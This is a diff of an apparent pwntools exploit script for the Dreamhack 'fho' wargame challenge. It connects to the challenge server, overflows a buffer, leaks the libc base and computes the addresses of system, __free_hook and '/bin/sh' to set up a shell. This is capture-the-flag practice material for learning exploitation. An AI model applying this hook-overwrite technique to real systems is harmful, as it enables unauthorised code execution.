@@ -5,14 +5,12 @@ def slog(n, m):	return success(": ".join([n, hex(m)]))
 # p = process("./fho")
 
 # For Online
-# """
 HOST = int(input("Input host number: "))
 PORT = int(input("Input port number: "))
 p = remote("host"+str(HOST)+".dreamhack.games", PORT)
-# """
 
 elf = ELF("./fho")
-libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
+libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")
 
 # [1] Library Var & Func Address
 buf = b'A' * 0x48	# char 0x30 + long long 0x08 * 2 + SFP 0x08
@@ -27,6 +25,7 @@ system = libc_base + libc.symbols["system"]
 free_hook = libc_base + libc.symbols["__free_hook"]
 binsh = libc_base + next(libc.search(b"/bin/sh"))
 
+info(hex(libc_start_main_xx))
 slog("libc_base", libc_base)
 slog("system", system)
 slog("free_hook", free_hook)
